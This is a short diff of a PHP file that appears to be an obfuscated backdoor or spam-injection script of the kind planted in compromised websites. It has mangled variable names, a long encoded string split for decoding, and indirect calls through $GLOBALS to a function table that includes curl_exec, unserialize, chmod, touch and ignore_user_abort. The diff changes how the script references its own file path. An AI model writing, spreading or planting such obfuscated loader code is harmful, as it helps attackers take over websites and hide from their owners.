@@ -34,7 +34,7 @@ foreach($bb66b6b6b as $b666bb=>$b666bbb){
 
 $flist = array("strpos","curl_close","array_unshift","curl_init","fopen","define","file_exists","array_unique","strrpos","in_array","trim","header","filemtime","preg_split","urldecode","array_pop","is_array","is_numeric","ceil","preg_match_all","extract","sprintf","range","fgets","setcookie","feof","array_merge","count","file_get_contents","strtolower","strtotime","rename","ord","curl_setopt","md5","stripos","gethostbyname","chr","explode","set_time_limit","time","shuffle","unserialize","gethostbyaddr","chmod","curl_exec","addcslashes","fclose","date","ignore_user_abort","ip2long","preg_match","ob_start","fwrite","function_exists","array_rand","is_file","touch","strtr","str_replace","substr","parse_url","preg_replace","strlen","urlencode","mt_rand","implode","phpinfo");
 
-$bbbb66666=__FILE__;
+//$bbbb66666=__FILE__;
 
 $b6b6b6b6=explode("9","bbb6bbbb69bbb666b9bb6bb6b9bb66bb69b66666b9bbb66669bb6b66b669b666bbb69b66b6b69b66b6666b9b666bb66b9b6b66bbb69b666bbb669b6bb6b669b6bbb66b9b6bb6b66b9b66bbb69bbb6b6b9b6b6bb669b6b6bb6bb9bb6b6b6b69b66bbb6bb9bb6b6b9bbbbbb69b66b6bbb9b6666bb9b6b6669bbbb666bb9b6bbbb6b9bbb6b6b669bb666b69b6bb6bbb9b6bbbbb669b6bbbb69b66b6669b6bbbb669bb66bb6b69b6bbb6bbb9b66bb6b69b6b6bbb9b66b669b6bb66b69bb6669b66bb66669bb6b66bb9b6bb6bb69bbbb6669bbb6b6bbb9bbbb666b9bb66b6bb69b6bbbbb9bbb66666b9b6b66b6b9b6666b6b9bb6666bbb9b66b6bb9bbbbbb9bb6bb69b666b6669b6bb666669b6bb6b69b6b6bb9bbb6bbb669b6b666bb69b666666b69bb6b6bb9bbbbbb669b6bbb6b6b");
 
@@ -90,7 +90,7 @@ function l11b68x($l1W){
     return l1FLe62h($l1W);
 }
 
-$bbbb66b6=$GLOBALS["b6bbbb6b"]($bbbb66666);
+$bbbb66b6=$GLOBALS["b6bbbb6b"](__FILE__);
 // <Insert long>
 
 foreach($b6b66b as$b6b666b=>$bbb66bb6){
